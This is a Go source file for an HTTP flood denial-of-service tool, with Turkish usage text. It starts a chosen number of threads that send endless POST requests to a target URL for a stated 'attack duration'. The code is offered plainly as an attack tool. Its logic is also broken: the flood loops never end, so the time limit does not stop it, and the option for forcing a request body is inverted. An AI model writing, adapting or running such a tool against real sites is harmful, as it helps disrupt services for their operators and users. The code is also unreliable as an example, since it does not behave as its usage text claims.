package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func generateRandomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func sendRequest(url string, body string, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		resp, err := http.Post(url, "application/json", strings.NewReader(body))
		if err != nil {
			fmt.Printf("Failed to send request to %s\n", url)
		} else {
			fmt.Printf("Request sent to %s\n", url)
			resp.Body.Close()
		}
	}
}

func httpFlood(url string, seconds int, threads int, forceBody bool, bodyText string) {
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			body := ""
			if forceBody {
				if bodyText == "zorla" {
					body = generateRandomString(100)
				} else {
					body = bodyText
				}
			}
			sendRequest(url, body, &wg)
		}()
	}

	time.Sleep(time.Duration(seconds) * time.Second)
	wg.Wait()

	fmt.Println("HTTP flood attack finished.")
}

func main() {
	args := os.Args[1:]
	if len(args) == 0 {
		fmt.Println("Kullanım: go run main.go <URL> <Süre> <Thread> [Zorla]")
		fmt.Println("<URL>     : Hedef URL adresi")
		fmt.Println("<Süre>    : Saldırı süresi (saniye)")
		fmt.Println("<Thread>  : Eşzamanlı çalışacak istek sayısı")
		fmt.Println("[Zorla]   : (İsteğe bağlı) Zorlama için kullanılacak argüman ('zorla' veya başka bir değer)")
		return
	}

	url := args[0]
	seconds := 10
	threads := 5
	forceBody := false

	if len(args) > 1 {
		seconds, _ = strconv.Atoi(args[1])
	}
	if len(args) > 2 {
		threads, _ = strconv.Atoi(args[2])
	}
	if len(args) > 3 {
		forceArg := args[3]
		if forceArg != "zorla" {
			forceBody = true
		}
	}

	httpFlood(url, seconds, threads, forceBody, "")
}

